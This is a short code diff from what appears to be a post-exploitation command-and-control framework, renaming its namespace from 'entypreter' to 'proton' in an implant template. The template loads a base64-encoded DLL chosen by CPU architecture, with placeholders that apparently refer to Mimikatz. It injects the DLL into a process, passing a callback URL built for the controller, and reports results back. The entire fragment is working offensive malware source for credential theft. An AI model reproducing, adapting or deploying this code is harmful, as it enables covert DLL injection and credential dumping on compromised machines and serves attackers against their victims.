@@ -129,11 +129,11 @@ try {
 	#al#.Add(undefined);
 	var #o# = #d#.DynamicInvoke(#al#.ToArray()).CreateInstance(#entry_class#);
 
-    var #shim_lpParam# = "~MIMICMD~~~~UUIDHEADER~~~~SHIMX64UUID~~~~MIMIX86UUID~~~~MIMIX64UUID~~~" + entypreter.work.make_url();
+    var #shim_lpParam# = "~MIMICMD~~~~UUIDHEADER~~~~SHIMX64UUID~~~~MIMIX86UUID~~~~MIMIX64UUID~~~" + proton.work.make_url();
     var #base64DLL# = "";
     if (~ONESHOTAUTO~)
     {
-        if(entypreter.user.Arch() == "AMD64")
+        if(proton.user.Arch() == "AMD64")
         {
             #base64DLL# = ~SHIMX64B64~;
             #shimoffset# = ~SHIMX64OFFSET~;
@@ -150,9 +150,9 @@ try {
         #shimoffset# = ~SHIMOFFSET~;
     }
     #o#.InjectDLL(#base64DLL#, #shim_lpParam#, #shimoffset#);
-    entypreter.work.report("Done");
+    proton.work.report("Done");
 } catch (e) {
-    entypreter.work.error(e);
+    proton.work.error(e);
 }
 
-entypreter.exit();
+proton.exit();
